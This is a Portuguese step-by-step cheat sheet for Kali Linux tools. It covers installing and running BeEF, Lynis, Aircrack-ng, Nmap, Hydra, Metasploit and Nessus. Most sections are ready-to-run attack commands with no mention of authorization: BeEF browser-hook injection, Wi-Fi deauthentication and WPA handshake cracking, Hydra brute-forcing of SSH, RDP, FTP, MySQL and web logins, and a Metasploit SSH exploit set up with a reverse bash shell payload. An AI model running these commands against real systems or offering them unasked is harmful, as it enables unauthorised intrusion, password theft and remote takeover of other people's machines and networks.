1. BEEF - BROWSER EXPLOITATION FRAMEWORK
    

O que faz: Explora vulnerabilidades em navegadores web.

Como instalar:  
sudo apt update  
sudo apt install beef-xss

Como usar passo a passo:

Passo 1: Iniciar o BeEF  
Digite no terminal: sudo beef-xss

Passo 2: Acessar o painel de controle  
Abra o navegador Firefox ou Chrome  
Digite na barra de endereço: [http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)  
Login: beef  
Senha: a que apareceu no terminal quando você iniciou

Passo 3: Obter o script de hook  
No painel do BeEF, clique no menu "Hooking" no topo da tela  
Copie o script que aparece: script src="http://SEU_IP:3000/hook.js" /script

Passo 4: Ver navegadores hookados  
No painel do BeEF, clique em "Online Browsers" no lado esquerdo  
Os navegadores conectados aparecerão ali

Onde clicar no BeEF:  
Current Browsers: para ver navegadores hookados  
Commands: para executar comandos nos navegadores  
Logs: para ver histórico de atividades  
REST API: para configurações avançadas

Para parar o BeEF: sudo beef-xss-stop

2. LYNIS - AUDITOR DE SEGURANÇA
    

O que faz: Auditoria de segurança para sistemas Linux.

Como instalar:  
sudo apt update  
sudo apt install lynis

Como usar passo a passo:

Passo 1: Executar auditoria completa  
Digite: sudo lynis audit system

Passo 2: Ver o relatório  
Digite: cat /var/log/lynis-report.dat

Passo 3: Ver apenas as sugestões  
Digite: sudo lynis audit system | grep "suggestion"

Auditorias específicas:  
Para auditar apenas o kernel: sudo lynis audit system --tests-from-group kernel  
Para auditar apenas rede: sudo lynis audit system --tests-from-group networking  
Para auditar apenas firewall: sudo lynis audit system --tests-from-group firewalls  
Para modo rápido: sudo lynis audit system --quick

Onde ver os resultados:  
No terminal: a saída aparece colorida (verde significa ok, amarelo significa sugestões)  
Relatório completo: /var/log/lynis-report.dat  
Log detalhado: /var/log/lynis.log

3. AIRCRACK-NG - TESTE DE REDES WI-FI
    

O que faz: Auditoria de redes sem fio.

Como instalar:  
sudo apt update  
sudo apt install aircrack-ng

Como usar passo a passo:

Passo 1: Verificar interfaces de rede  
Digite: iwconfig  
Veja o nome da sua placa Wi-Fi (geralmente wlan0)

Passo 2: Matar processos conflitantes  
Digite: sudo airmon-ng check kill

Passo 3: Ativar modo monitor  
Digite: sudo airmon-ng start wlan0  
Sua interface agora será wlan0mon

Passo 4: Escanear redes Wi-Fi próximas  
Digite: sudo airodump-ng wlan0mon  
Anote o BSSID (MAC da rede) e o CANAL (CH) da rede que você quer testar

Passo 5: Focar em uma rede específica  
Digite: sudo airodump-ng -c NUMERO_DO_CANAL --bssid MAC_DA_REDE -w captura wlan0mon

Passo 6: Forçar reconexão (abra um SEGUNDO terminal)  
Digite: sudo aireplay-ng -0 2 -a MAC_DA_REDE wlan0mon

Passo 7: Quebrar a senha (após capturar o handshake)  
Digite: sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap

Passo 8: Desativar modo monitor quando terminar  
Digite: sudo airmon-ng stop wlan0mon

Passo 9: Restaurar a rede  
Digite: sudo systemctl restart NetworkManager

Versão mais fácil com interface gráfica: digite sudo wifite

4. NMAP - NETWORK MAPPER
    

O que faz: Scanner de rede e portas.

Como instalar:  
sudo apt update  
sudo apt install nmap

Como usar passo a passo:

Passo 1: Escaneamento básico de rede  
Digite: nmap 192.168.1.0/24  
(use o IP da sua rede)

Passo 2: Escanear portas específicas  
Digite: nmap -p 80,443 192.168.1.1

Passo 3: Escanear um intervalo de portas  
Digite: nmap -p 1-1000 192.168.1.1

Passo 4: Detectar versões dos serviços  
Digite: nmap -sV 192.168.1.1

Passo 5: Detectar Sistema Operacional  
Digite: sudo nmap -O 192.168.1.1

Passo 6: Escaneamento completo  
Digite: sudo nmap -A 192.168.1.1

Passo 7: Usar scripts de vulnerabilidade  
Digite: nmap --script=vuln 192.168.1.1

Passo 8: Escanear apenas hosts ativos  
Digite: nmap -sn 192.168.1.0/24

Passo 9: Salvar resultado em um arquivo  
Digite: nmap 192.168.1.1 -oN resultado.txt

Como usar o Zenmap (versão com interface gráfica):  
Digite: sudo zenmap

No Zenmap:  
Campo "Target": digite o IP do alvo  
Campo "Profile": escolha o tipo de scan (Intense scan, Quick scan, Ping scan)  
Clique no botão "Scan"  
Os resultados aparecem nas abas: Nmap Output, Ports/Hosts, Topology, Host Details

5. THC HYDRA - QUEBRADOR DE SENHAS
    

O que faz: Ataque de força bruta em vários protocolos.

Como instalar:  
sudo apt update  
sudo apt install hydra

Preparar listas de palavras:  
Digite: sudo gunzip /usr/share/wordlists/rockyou.txt.gz

Como usar passo a passo:

Ataque SSH com um usuário específico:  
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

Ataque SSH com lista de usuários:  
hydra -L usuarios.txt -P senhas.txt ssh://192.168.1.100

Ataque FTP:  
hydra -l admin -P senhas.txt ftp://192.168.1.100

Ataque RDP (Windows):  
hydra -l administrator -P senhas.txt rdp://192.168.1.100

Ataque em formulário de login HTTP:  
hydra -l admin -P senhas.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

Ataque MySQL:  
hydra -l root -P senhas.txt mysql://192.168.1.100

Ataque com arquivo de credenciais (usuário:senha):  
hydra -C credenciais.txt ssh://192.168.1.100

Limitar tentativas por minuto:  
hydra -l admin -P senhas.txt -t 4 ssh://192.168.1.100

Filtrar senhas por tamanho (6 a 12 caracteres):  
pw-inspector -i senhas.txt -o filtradas.txt -m 6 -M 12

6. METASPLOIT FRAMEWORK
    

O que faz: Framework para exploração de vulnerabilidades.

Como instalar (já vem no Kali):  
sudo apt update  
sudo apt install metasploit-framework

Preparar o banco de dados:  
sudo systemctl start postgresql  
sudo msfdb init

Como usar passo a passo:

Passo 1: Iniciar o Metasploit  
Digite: sudo msfconsole

Dentro do Metasploit (msf6 prompt):

Passo 2: Buscar exploits  
Digite: search ssh  
Digite: search type:exploit platform:windows

Passo 3: Usar um exploit  
Digite: use exploit/linux/ssh/sshexec

Passo 4: Ver as opções disponíveis  
Digite: show options

Passo 5: Configurar o alvo  
Digite: set RHOSTS 192.168.1.100  
Digite: set RPORT 22  
Digite: set USERNAME root  
Digite: set PASSWORD toor

Passo 6: Configurar o payload (código que vai executar)  
Digite: set payload cmd/unix/reverse_bash

Passo 7: Configurar seu IP para receber a conexão  
Digite: set LHOST 192.168.1.50  
Digite: set LPORT 4444

Passo 8: Executar o ataque  
Digite: exploit

Passo 9: Ver sessões ativas  
Digite: sessions -l

Passo 10: Entrar em uma sessão  
Digite: sessions -i 1

Passo 11: Voltar ao msfconsole (dentro da sessão)  
Digite: background

Passo 12: Sair do Metasploit  
Digite: exit

Comandos úteis dentro do Metasploit:  
Listar todos os exploits: show exploits  
Listar payloads: show payloads  
Listar módulos auxiliares: show auxiliary  
Buscar por CVE específico: search cve:2021  
Usar scanner de portas: use auxiliary/scanner/portscan/tcp  
set RHOSTS 192.168.1.0/24  
run

7. NESSUS - SCANNER DE VULNERABILIDADES
    

O que faz: Scanner automatizado de vulnerabilidades.

Como instalar:  
Baixar do site da Tenable ([www.tenable.com/downloads/nessus](https://www.tenable.com/downloads/nessus)) - precisa cadastrar  
Instalar o pacote: sudo dpkg -i Nessus-10.8.5-ubuntu1604_amd64.deb  
Iniciar o serviço: sudo systemctl start nessusd  
Verificar status: sudo systemctl status nessusd

Como acessar:  
Abra o navegador e digite: [https://localhost:8834/](https://localhost:8834/)  
Clique em "Avançado" e depois "Prosseguir"

Primeiro acesso:  
Escolha "Nessus Essentials" (versão gratuita)  
Obtenha a chave de ativação no site da Tenable (enviam por email)  
Crie um usuário administrador  
Aguarde o download dos plugins (15 a 30 minutos)

Como criar um scan:  
Clique em "New Scan"  
Escolha o tipo: "Basic Network Scan" é o mais comum  
Configure:  
Name: digite um nome para o scan  
Targets: digite o IP ou rede (ex: 192.168.1.0/24)  
Credentials: opcional, coloque usuário e senha para escanear mais fundo

Como executar o scan:  
Clique no scan que você criou  
Clique em "Launch"  
Aguarde a execução (pode levar minutos ou horas)

Como ver os resultados:  
Clique no scan finalizado  
Abas principais:  
Vulnerabilities: lista de vulnerabilidades encontradas  
Remediations: soluções recomendadas  
Hosts: lista de hosts escaneados  
History: histórico de execuções

Comandos úteis do Nessus:  
Parar o serviço: sudo systemctl stop nessusd  
Reiniciar: sudo systemctl restart nessusd  
Ver logs: sudo tail -f /opt/nessus/logs/nessusd.log  
Verificar licença: sudo /opt/nessus/sbin/nessus-cli license

RESUMO RÁPIDO

BeEF: sudo beef-xss - Para explorar navegadores  
Lynis: sudo lynis audit system - Para auditar sistema  
Aircrack-ng: sudo airmon-ng start wlan0 - Para testar Wi-Fi  
Nmap: nmap 192.168.1.0/24 - Para escanear rede  
Hydra: hydra -l user -P pass.txt ssh://IP - Para força bruta  
Metasploit: sudo msfconsole - Para explorar vulnerabilidades  
Nessus: systemctl start nessusd - Scanner de vulnerabilidades